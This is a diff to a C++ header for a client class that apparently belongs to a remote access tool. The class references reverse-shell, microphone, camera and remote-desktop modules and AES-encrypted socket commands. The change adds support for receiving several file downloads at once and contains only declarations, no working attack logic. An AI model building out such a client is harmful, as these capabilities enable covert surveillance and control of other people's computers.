@@ -19,6 +19,17 @@ struct Paquete_Queue {
 	u_int uiTipoPaquete;
 };
 
+struct Archivo_Descarga {
+	std::shared_ptr<std::ofstream> ssOutfile;
+	double uTamArchivo;
+	double uDescargado;
+
+	Archivo_Descarga():
+		ssOutfile(nullptr), uTamArchivo(0), uDescargado(0){}
+
+	~Archivo_Descarga() = default;
+};
+
 class ReverseShell;
 class Mod_Mic;
 
@@ -30,6 +41,7 @@ class Cliente {
 		std::mutex mtx_running;
 		std::mutex mtx_queue;
 		std::mutex mtx_kill;
+		std::mutex mtx_map_archivos;
 		
 		std::thread p_thQueue;
 
@@ -45,12 +57,11 @@ class Cliente {
 		mod_Camera*        mod_Cam        = nullptr;
 		mod_RemoteDesktop* mod_RemoteDesk = nullptr;
 
-		//Para recibir archivo (single)
-		std::ofstream ssArchivo;
-		FILE *fpArchivo = nullptr;
-
 		//Map para armar los paquetes entrantes
 		std::map<int, std::vector<char>> paquetes_Acumulados;
+
+		//Map para recibir multiples archivos al mismo tiempo
+		std::map<const std::string, struct Archivo_Descarga> map_Archivos_Descarga;
 
 		//Queue para comandos recibidos
 		std::queue<Paquete_Queue> queue_Comandos;
@@ -127,6 +138,7 @@ class Cliente {
 		void m_DeserializarPaquete(const char* cBuffer, Paquete& paquete);
 		int cChunkSend(SOCKET& pSocket, const char* pBuffer, int pLen, int pFlags, bool isBlock, DWORD* err_code, int iTipoPaquete);
 
+		void Agregar_Archivo_Descarga(Archivo_Descarga& nuevo_archivo, const std::string strID);
 
 		//AES
 		ByteArray bDec(const unsigned char* pInput, size_t pLen);
